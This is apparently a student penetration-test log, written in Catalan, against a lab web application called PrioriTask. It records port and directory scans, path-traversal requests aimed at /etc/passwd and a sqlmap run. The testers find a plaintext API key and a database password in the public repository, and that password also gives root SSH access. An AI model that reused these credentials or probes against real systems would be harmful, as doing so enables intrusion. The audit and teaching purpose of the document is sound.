## Scope

scope --> 192.168.255.26
url --> prioritask.daw.institutmontilivi.cat

L'scope ès tota la màquina, aquesta respon a la IP 192.168.255.26 i conté la pagina web http://prioritask.daw.institutmontilivi.cat.

## Resum Executiu

## Once Exploited

En aquesta auditoria de seguretat s'han aconseguit les credencials de la base de dades i de l'usuari root. Per tant, **la màquina ha quedat compromesa completament podent descarregar tots els fitxers de la mateixa i totes les dades**. 

Si es tractés d'un entorn real en producció, tot el sistema estaria compromès i s'hauria d'avisar a tots els usuaris de la incidència tal com estableix la llei 3\2018 de protecció de dades.

Recomanem prendre mesures per tal de tancar els forats de seguretat com més aviat millor i evitar possibles problemes futurs.

## Log / Bitàcora - Recognizement

En aquest punt del reconeixement es fan un conjunt de proves inicials per saber a què ens enfrontem abans de començar. L'objectiu és fer-nos una idea general del scope i descartar tipus d'atacs. En primer lloc, es realitzen les accions de reconeixement passiu i seguidament les de reconeixement actiu sempre i quan puguem deixar rastre.  

**Acció 1:**

Persona --> Jaume
Temps --> 06/03/2023
Acció --> Reconeixement actiu amb NMAP
Endpoint --> 192.168.255.26
Resultat --> Hi han els ports **22 80 443 12320 12321 12322** oberts
Output:

--> Nmap complet
```
(18:05:22)[dl. de març 06]jaumellb@jaumellb-virtualbox:$ nmap -p- 192.168.255.26
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 18:05 CET
Nmap scan report for prioritask.daw.institutmontilivi.cat (192.168.255.26)
Host is up (0.0020s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
12320/tcp open  unknown
12321/tcp open  warehouse-sss
12322/tcp open  warehouse
Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds
```

--> Nmap per obtenir versions del serveis amb port obert
```
(18:06:03)[dl. de març 06]jaumellb@jaumellb-virtualbox:$ nmap -sV 192.168.255.26
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 18:06 CET
Nmap scan report for prioritask.daw.institutmontilivi.cat (192.168.255.26)
Host is up (0.0052s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds
```
**Acció 2:**

Persona --> Angel
Temps --> 06/03/2023 --> 17:15 --> 18:00
Acció --> OSINT
Endpoint --> 192.168.255.26
Resultat -->

- Codi public a repositori: https://github.com/LuisMezaMontilivi/PrioriTask
- Gestor bdd --> Adminer 4.7.9: https://prioritask.daw.institutmontilivi.cat:12322/

**Acció 3:**

Persona --> Jaume
Temps --> 07/03/2023 --> 17:41 --> 17:45
Acció --> Buscar directoris amb **Gobuster**
Endpoint --> 192.168.255.26
Resultat --> Existeixen almenys el següents directoris 
`/doc`  És un Natural Docs amb una documentació amb les explicacions de les funcions però no hi cap contrasenya ni dades sensibles.  
`/front` --> 404 Not Foundserver
`/server-status` --> Informació de sistema del Apache Server
Output:
```
(17:41:08)[dt. de març 07]jaumellb@jaumellb-virtualbox:$ gobuster dir -k -u https://prioritask.daw.institutmontilivi.cat/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://prioritask.daw.institutmontilivi.cat/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/07 17:41:12 Starting gobuster in directory enumeration mode
===============================================================
/doc                  (Status: 301) [Size: 257] [--> https://prioritask.daw.institutmontilivi.cat/doc/]
/front                (Status: 301) [Size: 259] [--> https://prioritask.daw.institutmontilivi.cat/front/]
/server-status        (Status: 200) [Size: 37110]                                                        
                                                                                                         
===============================================================
2023/03/07 17:45:10 Finished
===============================================================
```

Persona --> Jaume
Temps --> 07/03/2023 --> 17:53 --> 17:59
Acció --> Buscar subdominis amb **Gobuster**
Endpoint --> 192.168.255.26
Resultat --> No existeixen subdirectoris
Output:
```
(17:53:04)[dt. de març 07]jaumellb@jaumellb-virtualbox:$ gobuster vhost -k -u https://prioritask.daw.institutmontilivi.cat/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep 200
```

**Acció 4:**
Persona --> Cristian
Temps --> 06/03/2023 --> 18:00
Acció --> Petició HTTP
Endpoint --> 192.168.255.26
Resultat --> Podem entrar a la pàgina sense problemes, el port 80 està obert
Output:
```
(18:05:40)[lun mar 06]lao@parrot:$ wget http://prioritask.daw.institutmontilivi.cat/
--2023-03-06 18:06:21--  http://prioritask.daw.institutmontilivi.cat/
Resolviendo prioritask.daw.institutmontilivi.cat (prioritask.daw.institutmontilivi.cat)... 192.168.255.26
Conectando con prioritask.daw.institutmontilivi.cat (prioritask.daw.institutmontilivi.cat)[192.168.255.26]:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 897 [text/html]
Grabando a: «index.html»

index.html                                      100%[=====================================================================================================>]     897  --.-KB/s    en 0s      

2023-03-06 18:06:21 (129 MB/s) - «index.html» guardado [897/897]
```

Persona --> Cristian
Temps --> 06/03/2023 --> 18:08
Acció --> Petició HTTPS
Endpoint --> 192.168.255.26
Resultat --> No existeix certificat, no tenen entorn protegit, el port 443 està obert, però no s'hi pot accedir.
Output:
```
(18:08:18)[lun mar 06]lao@parrot:$ wget https://prioritask.daw.institutmontilivi.cat/
--2023-03-06 18:08:24--  https://prioritask.daw.institutmontilivi.cat/
Resolviendo prioritask.daw.institutmontilivi.cat (prioritask.daw.institutmontilivi.cat)... 192.168.255.26
Conectando con prioritask.daw.institutmontilivi.cat (prioritask.daw.institutmontilivi.cat)[192.168.255.26]:443... conectado.
ERROR: El certificado de «prioritask.daw.institutmontilivi.cat» no es confiable.
ERROR: The certificate of «prioritask.daw.institutmontilivi.cat» doesn't have a known issuer.
El propietario del certificado no se ajusta al nombre de equipo «prioritask.daw.institutmontilivi.cat»
```

Persona --> Cristian
Temps --> 06/03/2023 --> 18:12
Acció --> Petició SSH
Endpoint --> 192.168.255.26
Resultat --> Es pot establir una connexió ssh, el port 22 està obert.
Output:
```
(18:12:44)[lun mar 06]lao@parrot:$ ssh root@192.168.255.26
The authenticity of host '192.168.255.26 (192.168.255.26)' can't be established.
ECDSA key fingerprint is SHA256:l7PnujJSdaf/+e4yVyfpILO1yOnIGFHsY7fbMfBwAD8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.255.26' (ECDSA) to the list of known hosts.

root@192.168.255.26's password:
```

Persona --> Cristian
Temps -->06/03/2023 --> 18:18
Acció --> FTP
Endpoint --> 10.10.11.195
Resultat --> No es pot connectar, el port 21 està tancat.
Output:
```
(18:19:53)[lun mar 06]lao@parrot:$ ftp 192.168.255.26
ftp: connect: Connection refused
```

Persona --> Cristian
Temps -->06/03/2023 --> 18:21
Acció --> MYSQL
Endpoint --> 10.10.11.195
Resultat --> No es pot connectar, el port 3306 està tancat.
Output:
```
(18:21:42)[lun mar 06]lao@parrot:$ mysql -u root -h 192.168.255.26 -p
Enter password: 
ERROR 2002 (HY000): Can't connect to MySQL server on '192.168.255.26' (115)
```

Persona --> Cristian
Temps -->06/03/2023 --> 18:23
Acció --> SAMBA
Endpoint --> 10.10.11.195
Resultat --> No es pot connectar, el port 3306 està tancat.
Output:
```
(18:23:44)[lun mar 06]lao@parrot:$ smbclient -L 192.168.255.26
do_connect: Connection to 192.168.255.26 failed (Error NT_STATUS_CONNECTION_REFUSED)
```

Persona --> Cristian
Temps -->06/03/2023 --> 18:23
Acció --> whatweb
Endpoint --> http://prioritask.daw.institutmontilivi.cat/
Resultat --> El servidor web és un Apache, però no tenim la versió.
Output:
```
(18:25:25)[lun mar 06]lao@parrot:$ whatweb http://prioritask.daw.institutmontilivi.cat/
http://prioritask.daw.institutmontilivi.cat/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[192.168.255.26], Script, Strict-Transport-Security[max-age=63072000], Title[PrioriTask], UncommonHeaders[upgrade], X-UA-Compatible[IE=edge]
```

Persona --> Cristian
Temps -->06/03/2023 --> 19:19
Acció --> Accés per URL
Endpoint --> https://prioritask.daw.institutmontilivi.cat/server-status
Resultat --> La pàgina del server-status no està protegida, veiem que la versió d'Apache és 2.4.53
Output:

![imagen](https://user-images.githubusercontent.com/113126697/223197906-13c9c1a1-e084-4572-86cc-7443a2824205.png)


**Acció 5:**
Persona --> Angel
Temps --> 06/03/2023 --> 18:00 --> 20:55
Acció --> Revisio de vulnerabilitats visibles en el codi des del navegador
Endpoint --> 192.168.255.26
Resultat -->
-Trobat apikey en text pla al fitxer LoginView.vue:
```
    tokenInicial(){
          axios.put("http://prioritask.daw.institutmontilivi.cat/api/token/obtenir",{},{
            headers: {'apikey': "GuillemEsUnOient"}
          }
          )
            .then(resposta => {
              this.token = resposta.data;
            })
        }
```
- Xifratge del password al fitxer LoginView.vue: --> Llibreria cryptoJS --> sha256 

- Broken acces control:
Modificant el rol al localstorage podem veure les funcionalitats d'administrador tot i que no deixa utilitzar-les
![canviRolLocalStorage](https://user-images.githubusercontent.com/78735128/223527871-98c3a369-2865-49ae-8568-e15f62050abf.png)

**Conclusions:**

Un cop realitzades les accions de reconeixement, podem concloure que només hi ha disponibles els serveis oberts de HTTP, HTTPS i SSH amb els seus ports corresponents i tambe estan oberts els ports 12320, 12321 i 12322 que es corresponen amb els ports de la gestio web del servidor "turnkey". No existeixen subdominis. El que si hem descobert són els següents endpoints  `doc`, `front`, `server-status`, `css`, `js`. 

Fent el reconeixement utilitzant OSINT hem trobat el repositori públic a github: https://github.com/LuisMezaMontilivi/PrioriTask amb tot el codi de l'aplicacio. En la proxima fase analitzarem aquest codi per buscar-hi vulnerabilitats.

## Log / Bitàcora - Attack plan

En aquest apartat realitzem una sèrie de comprovacions per definir per on es pot atacar la màquina:

**Acció 1:**

Persona --> Jaume
Temps --> 07/03/2023 --> 19:40 --> 19:50
Acció --> Prova diferents tipus de path traversal 
Endpoint --> http://prioritask.daw.institutmontilivi.cat/
Resultat --> NO executa el path traversal normal ni en doble codificació. 
Output:

```
jaumellb@jaumellb-virtualbox:$ curl http://prioritask.daw.institutmontilivi.cat/../../../../../../../../../../etc/passwd/ 
<!doctype html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" href="/favicon.ico"><title>PrioriTask</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300&display=swap" rel="stylesheet"><script defer="defer" src="/js/chunk-vendors.0b0e9975.js"></script><script defer="defer" src="/js/app.fcd7120b.js"></script><link href="/css/chunk-vendors.982d62eb.css" rel="stylesheet"><link href="/css/app.740d0166.css" rel="stylesheet"></head><body><noscript><strong>We're sorry but PrioriTask doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"></div></body></html>
```

```
jaumellb@jaumellb-virtualbox:$ curl http://prioritask.daw.institutmontilivi.cat/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
</body></html>
```

```
jaumellb@jaumellb-virtualbox:$ curl http://prioritask.daw.institutmontilivi.cat/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```

**Acció 2:**

Persona --> Jaume
Temps --> 08/03/2023 --> 17:30
Acció --> Descarregar el codi del respositori amb un Git Clone obtingut amb osint 
Endpoint --> http://prioritask.daw.institutmontilivi.cat/
Resultat --> Tenim tot el codi de l'aplicació. MOLT IMPORTANT, hem obtingut la contrasenya de connexió a la base de dades. 
Output:

Contrasenya de la base de dades:
`self::$connection = new PDO("mysql:host=localhost;dbname=PrioriTaskBD", "adminer", "Bhun@89ble.oient");`
També sabem que el gestor de base de dades és el `adminer`

Codi:
![image](https://user-images.githubusercontent.com/113126548/223785965-09e604e2-3fb2-4baa-9e5f-0034b3debffc.png)

**Acció 3:**

Persona --> Angel
Temps --> 08/03/2023 --> 10:50 --> 11:00
Acció --> Sql map 
Endpoint -->  http://prioritask.daw.institutmontilivi.cat/modificar-tasca
Resultat --> Els parametres probats no son injectables
Output: -->
```
┌─[✗]─[angel@angel-parrot]─[~]
└──╼ $sqlmap -u http://prioritask.daw.institutmontilivi.cat/modificar-tasca?id=1 --level 1
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:54:56 /2023-03-08/

[10:54:56] [INFO] testing connection to the target URL
[10:54:56] [INFO] testing if the target URL content is stable
[10:54:57] [INFO] target URL content is stable
[10:54:57] [INFO] testing if GET parameter 'id' is dynamic
[10:54:57] [WARNING] GET parameter 'id' does not appear to be dynamic
[10:54:57] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[10:54:57] [INFO] testing for SQL injection on GET parameter 'id'
[10:54:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:54:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:54:58] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:54:58] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:54:58] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:54:58] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:54:59] [INFO] testing 'Generic inline queries'
[10:54:59] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:54:59] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:54:59] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:54:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:55:00] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:55:00] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[10:55:00] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[10:55:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:55:07] [WARNING] GET parameter 'id' does not seem to be injectable
[10:55:07] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[10:55:07] [WARNING] your sqlmap version is outdated

[*] ending @ 10:55:07 /2023-03-08/
```

**Acció 4:**

Persona --> Jaume
Temps --> 07/03/2023 --> 19:20 --> 19:35
Acció --> Injecció SQL al login
Endpoint --> `http://prioritask.daw.institutmontilivi.cat/login`
Resultat --> No es pot fer injecció SQL 
Output:

![image](https://user-images.githubusercontent.com/113126548/223517014-c01e010f-4935-4fed-ac1e-30779c6f7635.png)


**Acció 5:**

Persona --> Jaume
Temps --> 08/03/2023 --> 18:00 --> 18:15
Acció --> Comprovar si la contrasenya de la BBDD funciona
Endpoints --> https://192.168.255.26:12322/
Resultat --> Efectivament, amb l'usuari `adminer` i la contrasenya `Bhun@89ble.oient` tenim accés a la base de dades.
Output:
![image](https://user-images.githubusercontent.com/113126548/223788961-6fe00a09-1e10-4627-9bdb-82067bf6647c.png)

Persona --> Jaume
Temps --> 08/03/2023 --> 18:15 --> 18:30
Acció --> Comprovar si la contrasenya de la BBDD és la mateixa per la connexió SSH de root. 
Endpoints --> 192.168.255.26
Resultat --> Efectivament, amb l'usuari `root` i la contrasenya `Bhun@89ble.oient` tenim accés total a la màquina
Output:
```
(18:47:55)[dc. de març 08]jaumellb@jaumellb-virtualbox:$ ssh root@192.168.255.26

root@192.168.255.26's password: 
Welcome to Prioritask, TurnKey GNU/Linux 17.1 (Debian 11/Bullseye)

  System information for Wed Mar 08 17:48:06 2023 (UTC+0000)
  
    System load:  1.38              Memory usage:  26.2%
    Processes:    46                Swap usage:    0.0%
    Usage of /:   14.5% of 8.00GB   IP address for eth0: 172.17.100.114
                                    IP address for tun0: 192.168.255.26
  
  TKLBAM (Backup and Migration):  NOT INITIALIZED
  
    To initialize TKLBAM, run the "tklbam-init" command to link this
    system to your TurnKey Hub account. For details see the man page or
    go to:
  
        https://www.turnkeylinux.org/tklbam
  

    For Advanced commandline config run:    confconsole

  For more info see: https://www.turnkeylinux.org/docs/confconsole

Linux prioritask 5.15.30-2-pve #1 SMP PVE 5.15.30-3 (Fri, 22 Apr 2022 18:08:27 +0200) x86_64
Last login: Wed Mar  8 17:30:28 2023 from 192.168.255.1
root@prioritask ~# 
```

**Acció 6:**

Persona --> Jaume
Temps --> 06/03/2023 --> 19:15 --> 19:25
Acció --> Directory listing
Endpoint --> 192.168.255.26
Resultat --> S'han trobat les rutes `css` i  a `js` on hi ha el + Indexes activat.
Output:

![image](https://user-images.githubusercontent.com/113126548/223199061-504496f3-9037-4b08-a93d-02200c36f5c7.png)

![image](https://user-images.githubusercontent.com/113126548/223198967-e2b54034-fdbd-4431-8177-a8945f97b03d.png)


**Acció 7:**

Persona --> Angel
Temps --> 08/03/2023 --> 11:15 --> 11:30
Acció --> Reconeixement actiu amb OWASP ZAP
Endpoint --> 192.168.255.26
Resultat --> Informe generat amb owasz zap
Output:-->
![zap1](https://user-images.githubusercontent.com/78735128/223796270-26277838-e717-4211-a78e-f785f4f0da6e.png)
![zap2](https://user-images.githubusercontent.com/78735128/223796299-c4bfa188-05ed-4e0b-abf1-d67304458f3a.png)
![zap3](https://user-images.githubusercontent.com/78735128/223796315-b4acd36d-3360-4d2b-bdc6-7919bdc13b14.png)
![zap4](https://user-images.githubusercontent.com/78735128/223796333-d8586c0a-8e9a-4543-90eb-897cd902a198.png)
![zap5](https://user-images.githubusercontent.com/78735128/223796355-7e5bcb1e-ba0b-4820-8d79-435c372a4769.png)
![zap6](https://user-images.githubusercontent.com/78735128/223796360-6902b4b6-69e1-49ba-8788-518be4dea093.png)
![zap7](https://user-images.githubusercontent.com/78735128/223796375-b01e9768-6b43-40c2-b422-99b44abee4d8.png)
![zap8](https://user-images.githubusercontent.com/78735128/223796382-d247db4c-56b5-41d0-a999-f7ffe63f6698.png)

**Acció 8:**

Persona --> Jaume
Temps --> 08/03/2023 --> 18:30 --> 18:45
Acció --> Comprovar el tipus d'algoritmes de xifrat que s'utilitzen.
Endpoints --> http://prioritask.daw.institutmontilivi.cat/
Resultat --> Les funcions `GenerarTokenIdentificatiu` i `GeneracioToken` utilitzen algoritmes de xifrat insegurs **MD5**
Output:

```
    function GenerarTokenIdentificatiu($id,$email){
      $idHash = hash("ripemd320",$id);//utilitizar mètodes diferents de diferents mides per evitar que es trobi fàcilment el mètode que utiltizem
      $emailHash = hash("sha256",$email);
      $tempsHash = hash("md5",time());
      $verificacio = hash("sha512",$idHash . $emailHash . $tempsHash);
      return $idHash . $emailHash . $tempsHash . $verificacio;
```

```
    function GeneracioToken(){
      $ip = hash("md5",$this->ObtenirIP());//recuperem la IP des d'on ens fan la petició
      $data = hash("sha384",time());//obtenim el temps en format unix timestamp
      $validacio = $ip . $data;//fem una barreja entre tots dos per una part de validació
      return $ip . $data . hash("sha256",$validacio);
    }
```

**Acció 9:**

Persona --> Cristian
Temps --> 09/03/2023 --> 19:15 --> 19:40
Acció --> Mirar si tenen algun repositori local de GIT
Endpoint --> 192.168.255.26
Resultat --> Existeix un repositori dins del servidor, però no és de l'app és del desplegament del servidor.
Output:

```
root@prioritask ~# find / -iname ".git" 2>/dev/null
/etc/.git
root@prioritask ~# ls -la /etc | grep git
drwx------  8 root root      14 Mar  9 18:25 .git
-rw-------  1 root root     947 Feb  3 13:42 .gitignore
root@prioritask ~#
```

```
root@prioritask ~# cd /etc/
root@prioritask /etc# git status
On branch master
nothing to commit, working tree clean
root@prioritask /etc#
```

**Acció 10:**

Persona --> Jaume
Temps --> 09/03/2023 19:10-19:30
Acció --> Comprovar si hi han paquets desactualitzats
Endpoints --> 192.168.255.26
Resultat --> Si que hi han paquets desactualitzats
Output:

```
root@prioritask /etc# apt-get update
Get:1 http://security.debian.org/ bullseye-security InRelease [48.4 kB]
Hit:2 http://deb.debian.org/debian bullseye InRelease
Hit:3 https://packages.wazuh.com/4.x/apt stable InRelease
Ign:4 http://archive.turnkeylinux.org/debian bullseye-security InRelease
Ign:5 http://archive.turnkeylinux.org/debian bullseye InRelease
Hit:6 http://archive.turnkeylinux.org/debian bullseye-security Release
Hit:8 http://archive.turnkeylinux.org/debian bullseye Release
Fetched 48.4 kB in 1s (68.9 kB/s)
Reading package lists... Done
root@prioritask /etc# apt-get upgrade
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
The following packages will be upgraded:
  apache2 apache2-bin apache2-data apache2-utils base-files bash distro-info-data dpkg inithooks libc-bin libc-l10n libc6 libmariadb3 libpcre2-8-0 libsystemd0 libtasn1-6 libudev1 locales
  logrotate mariadb-client-10.5 mariadb-client-core-10.5 mariadb-common mariadb-server-10.5 mariadb-server-core-10.5 nano openssh-client openssh-server openssh-sftp-server postfix ssh
  systemd systemd-sysv tzdata udev webmin webmin-apache webmin-authentic-theme webmin-custom webmin-fail2ban webmin-fdisk webmin-filemin webmin-firewall webmin-firewall6 webmin-lvm
  webmin-mount webmin-mysql webmin-net webmin-passwd webmin-phpini webmin-postfix webmin-raid webmin-shell webmin-software webmin-sshd webmin-syslog webmin-time webmin-updown
  webmin-useradmin
58 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 60.1 MB of archives.
After this operation, 1493 kB of additional disk space will be used.
Do you want to continue? [Y/n] n
Abort.
root@prioritask /etc#
```

**Acció 11:**
Persona --> Angel
Temps --> 07/03/2023 --> 17:00 --> 18:30
Acció --> Revisio de codi trobat al repositori: https://github.com/LuisMezaMontilivi/PrioriTask
Endpoint --> 192.168.255.26
Resultat -->

- Trobada contrasenya d'acces a la bdd a l'arxiu BdD.php:
![passBdd](https://user-images.githubusercontent.com/78735128/223391669-a171ec44-47fb-41df-83cc-2c9b599a904a.png)

- Les querys d'acces a la bdd estan ben bindejades i no son injectables

- Les versions de les dependencies de l'aplicacio no tenen vulnerabilitats conegudes
![dependencies](https://user-images.githubusercontent.com/78735128/223396268-3daa5f95-7e35-4530-afad-dbdd656e3168.png)

- Rutes on es fan peticions:
```
http://prioritask.daw.institutmontilivi.cat/api/usuari/data
http://prioritask.daw.institutmontilivi.cat/api/tasca/data
http://prioritask.daw.institutmontilivi.cat/api/usuari/contrasenya
http://prioritask.daw.institutmontilivi.cat/api/usuari/llistat_tecnics
http://prioritask.daw.institutmontilivi.cat/api/tasca/crear
http://prioritask.daw.institutmontilivi.cat/api/usuari/alta
http://prioritask.daw.institutmontilivi.cat/api/tasca/llistat
http://prioritask.daw.institutmontilivi.cat/api/usuari/llistat
http://prioritask.daw.institutmontilivi.cat/api/token/obtenir
http://prioritask.daw.institutmontilivi.cat/api/usuari/iniciar
http://prioritask.daw.institutmontilivi.cat/api/tasca/modificar
http://prioritask.daw.institutmontilivi.cat/api/usuari/modificar
```

- Software and Data Integrity Failures:
No hi ha cap test per a cap de les funcionalitats de l'aplicacio

**Acció 12:**

Persona --> Jaume
Temps --> 08/03/2023 --> 18:00 --> 18:15
Acció --> Comprovar si la contrasenya de la BBDD funciona
Endpoints --> https://192.168.255.26:12322/
Resultat --> Efectivament, amb l'usuari `adminer` i la contrasenya `Bhun@89ble.oient` tenim accés a la base de dades.
Output:
![image](https://user-images.githubusercontent.com/113126548/223788961-6fe00a09-1e10-4627-9bdb-82067bf6647c.png)

Persona --> Jaume
Temps --> 08/03/2023 --> 18:15 --> 18:30
Acció --> Comprovar si la contrasenya de la BBDD és la mateixa per la connexió SSH de root. 
Endpoints --> 192.168.255.26
Resultat --> Efectivament, amb l'usuari `root` i la contrasenya `Bhun@89ble.oient` tenim accés total a la màquina
Output:
```
(18:47:55)[dc. de març 08]jaumellb@jaumellb-virtualbox:$ ssh root@192.168.255.26

root@192.168.255.26's password: 
Welcome to Prioritask, TurnKey GNU/Linux 17.1 (Debian 11/Bullseye)

  System information for Wed Mar 08 17:48:06 2023 (UTC+0000)
  
    System load:  1.38              Memory usage:  26.2%
    Processes:    46                Swap usage:    0.0%
    Usage of /:   14.5% of 8.00GB   IP address for eth0: 172.17.100.114
                                    IP address for tun0: 192.168.255.26
  
  TKLBAM (Backup and Migration):  NOT INITIALIZED
  
    To initialize TKLBAM, run the "tklbam-init" command to link this
    system to your TurnKey Hub account. For details see the man page or
    go to:
  
        https://www.turnkeylinux.org/tklbam
  

    For Advanced commandline config run:    confconsole

  For more info see: https://www.turnkeylinux.org/docs/confconsole

Linux prioritask 5.15.30-2-pve #1 SMP PVE 5.15.30-3 (Fri, 22 Apr 2022 18:08:27 +0200) x86_64
Last login: Wed Mar  8 17:30:28 2023 from 192.168.255.1
root@prioritask ~# 
```

Persona --> Jaume
Temps --> 08/03/2023 --> 18:30 --> 18:40
Acció --> Comprova el contingut de la ruta `http://prioritask.daw.institutmontilivi.cat/doc`
Endpoints --> http://prioritask.daw.institutmontilivi.cat/doc
Resultat --> En aquesta ruta, malgrat no hi ha dades especialment sensibles, si que hi ha explicacions de cada funció que poden donar pistes a l'atacant. 
Output:

![image](https://user-images.githubusercontent.com/113126548/224383823-3c255e07-8acd-43db-82a6-32ff142a76d9.png)

**Conclusions:**

Un cop realitzat tots els atacs veiem que hi ha moltes parts del lloc web que estan ven securitzades com per exemple el login i els arguments de les URLs. 

Després d'analitzar tot el codi descarregat gràcies al repositori públic, on hi hem trobat la contrasenya en text pla de la base de dades, ens crearem un usuari amb permisos d'administrador. Testejarem si la contrasenya de la bdd es la mateixa que algun usuari del sistema.


## Log / Bitàcora - Exploit

En aquest apartat intentarem guanyar accés al servidor, farem servir tota la informació que hem obtingut en la fase de reconeixement i seguirem el pla d'atac definit:


**Acció 1:**

Persona --> Angel
Temps --> 07/03/2023 --> 18:00 --> 19:00
Acció --> Acces a la bdd i creacio d'un usuari administrador
Endpoint --> 192.168.255.26
Resultat --> 

- Com que hem aconseguit el codi en el repositori amb l'usuari i contrasenya de la bdd i sabem que el gestor de bdd que fan servir es "adminer 4.7.9", Accedim a la bdd i crearem un usuari amb rol d'administrador per aixi tenir acces total a les funcionalitats de l'aplicacio. El password l'hem de xifrar amb l'algoritme que fan servir "sha-256"
![usuarisBdd](https://user-images.githubusercontent.com/78735128/223495982-bd53b252-a702-45a5-986a-38aab42e7f09.png)

- Accedim amb l'usuari oldschool@oldschool.cat : Admin123
![accesComAdmin](https://user-images.githubusercontent.com/78735128/223496939-f5715fb2-20c1-4eff-81a6-27df9a9a09b4.png)

- Creem una tasca:
![tascaUsuariAdmin](https://user-images.githubusercontent.com/78735128/223498578-ace7922b-6756-4c97-9458-f9ef40633a40.png)


**Acció 2:**

Persona --> Cristian
Temps --> 06/03/2023
Acció --> Connectar per SSH amb les credencials del repositori
Endpoint --> 192.168.255.26
Resultat --> Hem aconseguit entrar com a root.
Output:

Intentem entrar amb les credencials que hem trobat al repositori de git fitxer (PrioriTask/api/BdD.php):

usuari --> adminer
passwd --> Bhun@89ble.oient

```
(20:23:12)[Lun mar 06]lao@parrot:$ ssh root@192.168.255.26
adminer@192.168.255.26's password: 
Permission denied, please try again.
adminer@192.168.255.26's password: 
Permission denied, please try again.
```

```
(20:24:23)[Lun mar 06]lao@parrot:$ ssh root@192.168.255.26

root@192.168.255.26's password: 
Welcome to Prioritask, TurnKey GNU/Linux 17.1 (Debian 11/Bullseye)

  System information for Mon Mar 06 19:24:23 2023 (UTC+0000)
  
    System load:  1.26              Memory usage:  27.9%
    Processes:    44                Swap usage:    0.0%
    Usage of /:   14.5% of 8.00GB   IP address for eth0: 172.17.100.114
                                    IP address for tun0: 192.168.255.26
  
  TKLBAM (Backup and Migration):  NOT INITIALIZED
  
    To initialize TKLBAM, run the "tklbam-init" command to link this
    system to your TurnKey Hub account. For details see the man page or
    go to:
  
        https://www.turnkeylinux.org/tklbam
  

    For Advanced commandline config run:    confconsole

  For more info see: https://www.turnkeylinux.org/docs/confconsole

Linux prioritask 5.15.30-2-pve #1 SMP PVE 5.15.30-3 (Fri, 22 Apr 2022 18:08:27 +0200) x86_64
